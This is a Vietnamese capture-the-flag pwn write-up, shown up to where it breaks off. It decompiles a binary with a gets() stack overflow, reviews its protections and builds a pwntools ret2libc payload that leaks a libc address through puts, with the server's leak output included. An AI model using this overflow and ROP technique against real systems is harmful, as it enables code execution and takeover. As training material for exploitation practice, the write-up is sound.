# ida
```c
int date()
{
  return system("/bin/date");
}

__int64 vuln()
{
  char v1[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Tell us some review about our program: ");
  fflush(_bss_start);
  return gets(v1);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Welcome to the feedback submiter.");
  vuln();
  return 0;
}
```
# checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

##### thông qua ida và checksec, ta có 2 hướng, 1 là ret2libc , 2 là đổi symtem("/bin/date") thành symtem("/bin/sh")

# ret2libc
> do trong chương trình có hàm puts nên ta có put@got và put@plt dễ dành leak được libc và tính địa chỉ base.
```python
payload = b"a" * 72 + p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendlineafter(b"our program: ", payload)
leak_libc = u64(r.recvuntil(b"\nWelcome", drop=True)[1:]+b'\0\0')
log.info('leak libc: ' + hex(leak_libc))
```
chạy script trên sever ta nhận được ```leak libc: 0x7f1dec78aed0``` (ở đây 3kí tự cuối ```ed0``` là không đổi), tìm file libc trên mạng t có 1 file

tiếp đến ta pwninit nhưng... có vẻ như nó không tự động patched với nhau.
```
bin: ./exe

copying ./exe to ./exe_patched
running patchelf on ./exe_patched
```
nhưng không sao, ta sẽ tính tay.
___
Đầu tiên ta sẽ tính địa chỉ base libc 